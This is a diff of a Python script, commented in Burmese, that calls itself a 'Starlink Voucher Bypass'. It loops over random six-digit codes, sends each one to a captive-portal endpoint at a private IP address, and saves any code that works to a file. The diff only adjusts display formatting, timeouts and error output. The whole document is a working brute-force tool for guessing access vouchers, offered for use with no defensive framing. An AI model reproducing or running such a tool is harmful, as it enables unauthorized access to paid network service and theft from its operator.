@@ -4,37 +4,32 @@ import os
 import sys
 import requests
 
-# အရောင်သတ်မှတ်ချက်များ
-RED = '\033[91m'      # မရသော ကုဒ် (Fail)
-GREEN = '\033[92m'    # ရသော ကုဒ် (Success)
-WHITE = '\033[97m'    # လက်ရှိသုံးနေသော ကုဒ်
+# အရောင်များ
+RED = '\033[91m'      # Fail
+GREEN = '\033[92m'    # Success
+WHITE = '\033[97m'    # Testing
 CYAN = '\033[96m'
 YELLOW = '\033[93m'
 END = '\033[0m'
 
 url = "http://10.44.77.240:2060/expire_tip"
 
-def clear_screen():
-    os.system('clear')
-
 def start_scanning():
-    clear_screen()
+    os.system('clear')
     print(f"{CYAN}[+] Starlink Voucher Bypass Control{END}")
     print(f"{WHITE}[+] Range: 000000 - 999999 (Randomly Searching){END}")
     print(f"{YELLOW}[!] Scanning in progress...{END}\n")
     
     time.sleep(1)
     print(f"{CYAN}[+] Checking Bypass...{END}")
-    time.sleep(0.5)
     print(f"{WHITE}[+] Connection to Server: {GREEN}OK{END}")
-    time.sleep(0.5)
+    print(f"{WHITE}[*] Currently Testing codes...{END}\n")
 
     while True:
-        # 0 မှ 999999 အထိ ကျပန်း Code ထုတ်ခြင်း
         code = str(random.randint(0, 999999)).zfill(6)
         
-        # ၁။ လက်ရှိသုံးနေတဲ့ ကုဒ်ကို အဖြူရောင်နဲ့ပြခြင်း
-        print(f"{WHITE}[*] Currently Testing: {code}{END}", end='\r')
+        # လက်ရှိစမ်းနေတဲ့ code ကို အဖြူရောင်နဲ့ပြ (တစ်ကြောင်းတည်းပေါ်ရန်)
+        sys.stdout.write(f"{WHITE}\r[*] Trying: {code}{END}")
         sys.stdout.flush()
         
         params = {
@@ -46,22 +41,22 @@ def start_scanning():
         }
 
         try:
-            res = requests.get(url, params=params, timeout=2)
+            res = requests.get(url, params=params, timeout=1.5)
             
-            # ၂။ မရတဲ့ ကုဒ်ဆိုရင် အနီရောင်နဲ့ပြခြင်း
+            # မရရင် အနီရောင်စာတန်းကို အပေါ်သို့ တန်းစီပြီး ကျလာစေမည်
             if "failed" in res.text.lower() or "expire" in res.text.lower():
-                print(f"{RED}Fail Code: {code}{END}")
+                print(f"\n{RED}Fail Code: {code}{END}")
             
-            # ၃။ ရတဲ့ ကုဒ်ဆိုရင် အစိမ်းရောင်နဲ့ပြခြင်း
+            # ရရင် အစိမ်းရောင်နဲ့ပြပြီး ရပ်မည်
             elif res.status_code == 200:
-                print(f"{GREEN}\n[!!!] SUCCESS FOUND: {code}{END}")
+                print(f"{GREEN}\n\n[!!!] SUCCESS FOUND: {code}{END}")
                 with open("success.txt", "a") as f:
-                    f.write(f"Voucher: {code} | Date: {time.ctime()}\n")
+                    f.write(f"Voucher: {code} | {time.ctime()}\n")
                 break
         except:
-            pass
+            # Connection error ဖြစ်ရင်လည်း အနီရောင်နဲ့ပဲပြပေးထားမည်
+            print(f"\n{RED}Error: {code} (No Connection){END}")
         
-        # စာတန်းတွေ အရမ်းမမြန်အောင် အနည်းငယ် ထိန်းထားခြင်း
         time.sleep(0.1)
 
 if __name__ == "__main__":
